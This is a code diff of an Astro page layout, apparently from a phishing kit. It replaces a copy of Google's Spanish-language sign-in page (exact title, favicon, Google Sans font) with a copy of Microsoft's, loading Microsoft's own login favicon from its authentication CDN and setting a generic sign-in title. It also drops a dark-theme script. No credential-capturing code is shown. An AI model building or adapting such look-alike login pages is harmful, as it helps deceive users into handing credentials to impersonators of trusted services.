@@ -1,6 +1,5 @@
 ---
-import "@/styles/google.css";
-import "@/styles/google-2.css";
+import "@/styles/microsoft.css";
 ---
 
 <!doctype html>
@@ -8,31 +7,13 @@ import "@/styles/google-2.css";
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width" />
-    <link rel="icon" type="image/svg+xml" href="https://www.google.com/favicon.ico" />
+    <link rel="icon" type="image/svg+xml" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"/>
     <meta name="generator" content={Astro.generator} />
-    <title>Inicia sesión: Cuentas de Google</title>
+    <title>Iniciar sesión en la cuenta</title>
   </head>
-  <body class="dark">
+  <body class="min-h-screen">
     <slot />
   </body>
-  <script>
-    // Función para detectar el tema del usuario
-    function detectTheme() {
-      const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
-
-      if (prefersDarkScheme.matches) {
-        document.body.classList.add("dark");
-      } else {
-        document.body.classList.remove("dark");
-      }
-    }
-
-    // Ejecutar la función al cargar la página
-    detectTheme();
-
-    // Escuchar cambios en la preferencia del tema
-    window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", detectTheme);
-  </script>
 </html>
 
 <style>
@@ -41,17 +22,5 @@ import "@/styles/google-2.css";
     margin: 0;
     width: 100%;
     height: 100%;
-  }
-
-  body {
-    background-color: var(--gm3-sys-color-surface-container-lowest, #fff);
-    direction: ltr;
-    font-size: 0.875rem;
-    font-weight: 400;
-    letter-spacing: 0rem;
-    line-height: 1.4285714286;
-    margin: 0;
-    padding: 0;
-    font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
   }
 </style>
